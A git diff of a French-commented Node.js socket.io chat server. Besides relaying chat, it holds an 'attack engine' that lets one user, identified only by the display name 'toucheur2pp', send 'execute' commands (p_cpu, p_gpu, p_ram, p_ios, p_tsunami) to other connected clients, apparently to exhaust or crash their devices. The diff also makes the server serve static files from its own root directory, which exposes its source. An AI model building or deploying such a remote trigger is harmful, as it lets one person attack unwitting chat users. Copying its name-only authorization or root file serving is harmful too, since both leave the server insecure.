@@ -7,45 +7,34 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
-// --- CONFIGURATION PUNCH ---
-// On lie le dossier "public" pour le HTML/CSS
-app.use(express.static(path.join(__dirname, 'public')));
+// On sert les fichiers directement depuis la racine
+app.use(express.static(__dirname));
 
 let users = [];
 
 io.on('connection', (socket) => {
-    console.log(`[CONNEXION] ID: ${socket.id}`);
-
-    // Initialisation du Stand User
+    // Initialisation
     socket.on('init', (data) => {
-        const newUser = { 
-            id: socket.id, 
-            name: data.name || "Stand_User" 
-        };
+        const newUser = { id: socket.id, name: data.name || "Stand_User" };
         users.push(newUser);
         io.emit('sync', users);
-        console.log(`[PUNCH_SYNC] ${newUser.name} est prêt au combat.`);
+        console.log(`[JOIN] ${newUser.name}`);
     });
 
-    // Chat Relay
+    // Chat
     socket.on('chat', (msg) => {
         const user = users.find(u => u.id === socket.id);
-        if (user) {
-            io.emit('chat', { n: user.name, t: msg });
-        }
+        if (user) io.emit('chat', { n: user.name, t: msg });
     });
 
-    // --- MOTEUR D'ATTAQUE [THE WORLD] ---
-    const abilities = ['p_combo', 'p_tsunami', 'p_cpu', 'p_gpu', 'p_ios', 'p_ram'];
-    
-    abilities.forEach(ability => {
-        socket.on(ability, (targetId) => {
-            const admin = users.find(u => u.id === socket.id);
-            
-            // Vérification du grade Master
-            if (admin && admin.name === "toucheur2pp") {
-                console.log(`[EXECUTION] ${ability.toUpperCase()} sur ${targetId}`);
-                io.to(targetId).emit('execute', { type: ability });
+    // MOTEUR D'ATTAQUE [THE WORLD]
+    const attacks = ['p_combo', 'p_tsunami', 'p_cpu', 'p_gpu', 'p_ios', 'p_ram'];
+    attacks.forEach(type => {
+        socket.on(type, (targetId) => {
+            const boss = users.find(u => u.id === socket.id);
+            // Sécurité Master
+            if (boss && boss.name === "toucheur2pp") {
+                io.to(targetId).emit('execute', { type: type });
             }
         });
     });
@@ -53,22 +42,16 @@ io.on('connection', (socket) => {
     socket.on('disconnect', () => {
         users = users.filter(u => u.id !== socket.id);
         io.emit('sync', users);
-        console.log(`[DECONNEXION] ID: ${socket.id}`);
     });
 });
 
-// Route par défaut pour éviter le "Cannot GET /"
+// Route principale
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
+// Port adaptatif pour Render
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`
-    🥊 PUNCH SERVER ACTIVE [MODE: server.js]
-    ----------------------------------------
-    > Local : http://localhost:${PORT}
-    > Statut : ORA ORA ORA ORA !
-    ----------------------------------------
-    `);
+    console.log(`🥊 PUNCH V95 ACTIVE SUR PORT ${PORT}`);
 });
